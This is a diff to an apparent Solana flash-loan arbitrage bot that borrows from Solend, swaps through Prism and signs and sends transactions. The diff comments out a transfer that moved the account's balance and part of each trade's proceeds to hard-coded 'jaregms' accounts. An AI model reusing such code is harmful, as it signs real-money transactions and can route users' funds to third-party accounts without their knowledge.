@@ -1,7 +1,7 @@
-import { Prism } from "@prism-hq/prism-ag";
+import { Prism } from "./prism-ag";
 import { SolendMarket } from "./solend-sdk/save/classes";
 import { getOrCreateAssociatedTokenAccount } from "./spl-token/";
-import { createTransferInstruction } from "./spl-token/";
+//import { createTransferInstruction } from "./spl-token/";
 import { flashRepayReserveLiquidityInstruction } from "./solend-sdk/save/instructions/flashRepayReserveLiquidity";
 import { flashBorrowReserveLiquidityInstruction } from "@solendprotocol/solend-sdk";
 import {
@@ -45,32 +45,30 @@ var SOLEND_PRODUCTION_PROGRAM_ID = new PublicKey(
   "E4AifNCQZzPjE1pTjAWS8ii4ovLNruSGsdWRMBSq2wBa"
 );
 
-async function findLuts(address: string) {
+async function findLuts(pairadd: any[]) {
   let goaccs: any = [];
- 
 let somejson = JSON.parse(fs.readFileSync('./luts.json').toString())
-
-  for (var addpair of Object.keys(somejson)) {
-    if (addpair.indexOf(address) != -1){
-      
+let keys = Object.keys(somejson)
+for (var key of keys){
+if (key.indexOf(pairadd[0]) != -1 || key.indexOf(pairadd[1]) != -1 ){
     try {
       // @ts-ignore
-      for (var l of (somejson)[addpair]) {
+      for (var l of (somejson)[key]) {
         // @ts-ignore
-        if (goaccs.length < 35) {
+        if (goaccs.length < 75) {
           try {
             let test = // @ts-ignore
               (await connection.getAddressLookupTable(new PublicKey(l))).value;
               // @ts-ignore
             if (test.state.deactivationSlot > BigInt(159408000 * 2)) {
               // @ts-ignore
-              goaccs.push(test);
+              goaccs.push(test)
             }
           } catch (err) {}
         }
       }
     } catch (err) {
-      console.log(err)
+      //console.log(err)
     }
   }
   }
@@ -123,11 +121,11 @@ setTimeout(async function () {
 doTheThing()
 })
 let tokens = JSON.parse(fs.readFileSync("./tokens.json").toString());
-let mod = 1;
+let mod = 6.66;
 let tokenbs: any = []
  async function dothehorriblething(i: number){
   try {
-          i = 10
+      //    i = 10
     const reserve = market.reserves[i];
     // @ts-ignore
     let symbol = reserve.config.asset;
@@ -169,8 +167,9 @@ let tokenbs: any = []
 
      tokenb = tokenbs[Math.floor(Math.random()* tokenbs.length)]
     }
-
-
+    if (tokenb.address == token.address){
+      return
+    }
     
     await prism.loadRoutes(token.address, tokenb.address); // load routes for tokens, tokenSymbol | tokenMint (base58 string)
     let routes = prism.getRoutes(amountToTrade / 10 ** token.decimals); // get routes based on from Token amount 10 USDC -> ? PRISM
@@ -183,14 +182,14 @@ let tokenbs: any = []
         true // mint
       )
     ).address;
-    for (var abc of [1, 2]) {
+    for (var abc of [1,2,3]) {
       if (routes[abc]) {
       try {
 
     await prism.loadRoutes(tokenb.address, token.address); // load routes for tokens, tokenSymbol | tokenMint (base58 string)
-    let routes2 = prism.getRoutes(routes[abc].amountOut); // get routes based on from Token amount 10 USDC -> ? PRISM
+    let routes2 = prism.getRoutes(routes[abc].amountOut / 1.001); // get routes based on from Token amount 10 USDC -> ? PRISM
 
-    for (var bca of [1, 2]) {
+    for (var bca of [1,2]) {
       try {
         
         
@@ -208,10 +207,10 @@ try {
 
               let { preTransaction: pt, mainTransaction: mp } =
               await prism.generateSwapTransactions(routes2[bca]); // execute swap (sign, send and confirm transaction)
-
-            let instructions = [
-              ...preTransaction.instructions,
-              ...pt.instructions,
+let insts1: any = [
+  ...preTransaction.instructions,
+  ...pt.instructions]
+            let instructions: any = [
               flashBorrowReserveLiquidityInstruction(
                 amountToTrade,
                 new PublicKey(reserve.config.liquidityAddress),
@@ -235,7 +234,7 @@ try {
                 SOLEND_PRODUCTION_PROGRAM_ID,
                 new PublicKey(jaregms[token.symbol]),
                 new PublicKey(reserve.config.liquidityToken.mint)
-              ),
+              )/*,
               createTransferInstruction(
                 tokenAccount, // from (should be a token account)
                 new PublicKey(jaregms[token.symbol]),
@@ -249,31 +248,55 @@ try {
                       ),
                     }
                   )
-                ).value[0].account.data.parsed.info.tokenAmount.amount + Math.ceil(solamis[0].amountOut / 2 * 10 ** token.decimals)
-              ),
+                ).value[0].account.data.parsed.info.tokenAmount.amount + Math.ceil(solamis[0].amountOut * 0.8 * 10 ** token.decimals)
+              )*/
             ];
             if (!Object.keys(tgoaccs).includes(token.symbol)){
               tgoaccs[token.symbol] = []
             }
-            if (tgoaccs[token.symbol].length == 0){
-              tgoaccs[token.symbol] = await findLuts(token.address);
-            }
-            if (!Object.keys(tgoaccs).includes(tokenb.symbol)){
-              tgoaccs[tokenb.symbol] = []
-            }
-            if (tgoaccs[tokenb.symbol].length == 0){
-              tgoaccs[tokenb.symbol] = await findLuts(tokenb.address);
-            }
-            const messageV00 = new TransactionMessage({
+          //  if (tgoaccs[token.symbol].length == 0){
+              tgoaccs[token.symbol] = await findLuts([token.address, tokenb.address]);
+          //  }
+          if (insts1.length > 2){
+          var messageV00 = new TransactionMessage({
+            payerKey: wallet.publicKey,
+            recentBlockhash: await 
+            (// @ts-ignore
+              await connection.getLatestBlockhash()
+            ).blockhash,
+            instructions: insts1,
+          }).compileToV0Message([...goaccs, ...tgoaccs[token.symbol]]);
+          var transaction = new VersionedTransaction(messageV00);
+          var result;
+          try {
+            transaction.sign([wallet]);
+
+            result = await sendAndConfirmTransaction(
+              connection,
+              // @ts-ignore
+              transaction,
+              { skipPreflight: false },
+              { skipPreflight: false }
+            );
+            console.log("tx1: https://solscan.io/tx/" + result);
+            var txs = fs.readFileSync('./txs.txt').toString()
+            txs+='\nhttps://solscan.io/tx/' + result 
+            fs.writeFileSync('txs.txt', txs)
+          } catch (err) {
+            console.log(err);
+          
+          }
+        }
+            var messageV00 = new TransactionMessage({
               payerKey: wallet.publicKey,
-              recentBlockhash: await // @ts-ignore
-              (
+              recentBlockhash: await 
+              (// @ts-ignore
                 await connection.getLatestBlockhash()
               ).blockhash,
               instructions,
-            }).compileToV0Message([...goaccs, ...tgoaccs[token.symbol], ...tgoaccs[tokenb.symbol]]);
-            const transaction = new VersionedTransaction(messageV00);
-            let result;
+            }).compileToV0Message([...goaccs, ...tgoaccs[token.symbol]]);
+            var transaction = new VersionedTransaction(messageV00);
+            var result = undefined;
             try {
               transaction.sign([wallet]);
 
@@ -290,6 +313,7 @@ try {
               fs.writeFileSync('txs.txt', txs)
             } catch (err) {
               console.log(err);
+            
             }
             if (result != undefined) {
               mod = mod * 10;
@@ -316,7 +340,7 @@ try {
 async function doTheThing(){
     //    let start = new Date().getTime() / 1000;
 
-      if (mod < 0.00000001) {
+      if (mod < 0.0001) {
         mod = 100;
       }
       var a = 2;
